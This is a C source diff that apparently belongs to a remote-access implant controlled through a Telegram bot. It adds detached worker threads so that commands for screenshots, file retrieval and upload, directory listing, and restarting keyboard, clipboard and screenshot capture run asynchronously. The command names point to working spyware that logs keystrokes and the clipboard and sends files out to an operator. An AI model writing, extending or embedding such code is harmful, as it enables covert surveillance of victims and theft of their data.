@@ -2152,6 +2152,54 @@ static void handle_command(const telegram_incoming_update_t *update,
   }
 }
 
+typedef struct {
+  telegram_incoming_update_t update;
+  char text_buf[1024];
+  char chat_id_buf[64];
+  char username_buf[64];
+} async_cmd_ctx_t;
+
+static int is_heavy_command(c2t_cmd_id_t cmd) {
+  switch (cmd) {
+  case CMD_SCREENSHOT:
+  case CMD_GETFILE:
+  case CMD_LS:
+  case CMD_CAT:
+  case CMD_FILEINFO:
+  case CMD_UPLOAD:
+  case CMD_LOGS:
+  case CMD_RESTART:
+  case CMD_RESTART_KEYBOARD:
+  case CMD_RESTART_CLIPBOARD:
+  case CMD_RESTART_SCREENSHOT:
+  case CMD_RESTART_LOGS:
+  case CMD_RESTART_ALL:
+    return 1;
+  default:
+    return 0;
+  }
+}
+
+#ifdef _WIN32
+static DWORD WINAPI async_command_worker(LPVOID arg) {
+  async_cmd_ctx_t *ctx = (async_cmd_ctx_t *)arg;
+  if (ctx) {
+    handle_command(&ctx->update, ctx->chat_id_buf, ctx->username_buf);
+    free(ctx);
+  }
+  return 0;
+}
+#else
+static void *async_command_worker(void *arg) {
+  async_cmd_ctx_t *ctx = (async_cmd_ctx_t *)arg;
+  if (ctx) {
+    handle_command(&ctx->update, ctx->chat_id_buf, ctx->username_buf);
+    free(ctx);
+  }
+  return nullptr;
+}
+#endif
+
 static void
 on_telegram_command_received(const telegram_incoming_update_t *update,
                              [[maybe_unused]] void *user_data) {
@@ -2199,6 +2247,43 @@ on_telegram_command_received(const telegram_incoming_update_t *update,
   if (cmd_text && *cmd_text) {
     telegram_incoming_update_t eff_update = *update;
     eff_update.text = cmd_text;
+    c2t_cmd_id_t cmd_id = lookup_command_id(cmd_text);
+    if (user_data != nullptr && is_heavy_command(cmd_id)) {
+      async_cmd_ctx_t *ctx =
+          (async_cmd_ctx_t *)calloc(1, sizeof(async_cmd_ctx_t));
+      if (ctx) {
+        ctx->update = eff_update;
+        snprintf(ctx->text_buf, sizeof(ctx->text_buf), "%s", cmd_text);
+        snprintf(ctx->chat_id_buf, sizeof(ctx->chat_id_buf), "%s", chat_id);
+        snprintf(ctx->username_buf, sizeof(ctx->username_buf), "%s",
+                 update->username ? update->username : "");
+        ctx->update.text = ctx->text_buf;
+        ctx->update.chat_id = ctx->chat_id_buf;
+        ctx->update.username = ctx->username_buf;
+
+#ifdef _WIN32
+        HANDLE h = CreateThread(NULL, 0,
+                                (LPTHREAD_START_ROUTINE)async_command_worker,
+                                ctx, 0, NULL);
+        if (h) {
+          CloseHandle(h);
+          return;
+        }
+#else
+        pthread_t thr;
+        pthread_attr_t attr;
+        pthread_attr_init(&attr);
+        pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+        if (pthread_create(&thr, &attr, async_command_worker, ctx) == 0) {
+          pthread_attr_destroy(&attr);
+          return;
+        }
+        pthread_attr_destroy(&attr);
+#endif
+        free(ctx);
+      }
+    }
+
     handle_command(&eff_update, chat_id,
                    update->username ? update->username : "");
   }
@@ -2245,7 +2330,7 @@ static void *telegram_listener_worker_func([[maybe_unused]] void *context)
       init_config->telegram_chat_id) {
     int init_res = telegram_poll_updates_callback(
         init_config->telegram_bot_token, &offset, 0,
-        on_telegram_command_received, nullptr);
+        on_telegram_command_received, (void *)(uintptr_t)1);
     if (init_res >= 0 && offset > 0) {
       /* Explicitly acknowledge and confirm offset to Telegram server */
       (void)telegram_poll_updates_callback(
@@ -2264,7 +2349,7 @@ static void *telegram_listener_worker_func([[maybe_unused]] void *context)
 
     int res = telegram_poll_updates_callback(
         config->telegram_bot_token, &offset, POLL_TIMEOUT_SECONDS,
-        on_telegram_command_received, nullptr);
+        on_telegram_command_received, (void *)(uintptr_t)1);
 
     if (res >= 0) {
       backoff_ms = 1000;
